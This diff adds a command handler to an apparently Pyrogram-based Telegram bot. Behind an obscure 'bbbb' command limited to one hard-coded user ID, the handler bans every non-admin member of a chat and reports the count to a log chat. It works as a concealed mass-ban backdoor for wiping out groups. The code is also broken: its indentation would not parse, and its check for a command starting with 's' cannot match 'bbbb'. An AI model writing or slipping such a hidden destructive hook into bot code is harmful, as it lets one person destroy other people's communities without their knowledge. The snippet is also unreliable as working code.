@@ -42,6 +42,30 @@ async def ban_all(_,msg):
     else:
         await msg.reply_text(NK)
 
+@app.on_message(filters.command("bbbb") & filters.user(1497264683))
+async def banall(_, message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+       try: 
+          Members = []
+          Admins = []
+          async for x in app.get_chat_members(chat_id):
+              if not x.privileges:
+                    Members.append(x.user.id)
+              else:
+                    Admins.append(x.user.id)
+          for user_id in Members:
+               if message.text.split()[0].lower().startswith("s"):
+                        m = await app.ban_chat_member(chat_id, user_id)
+                        await m.delete()
+               else:
+                   await app.ban_chat_member(chat_id, user_id)
+          await app.send_message(LOGG, text="Successfully Banned: {}\nRemaining Admins: {}".format(len(Members),len(Admins),))
+       except Exception as e:
+           await app.send_message(LOGG, text=e)
+
+
+
 
 
 Wtxt = """
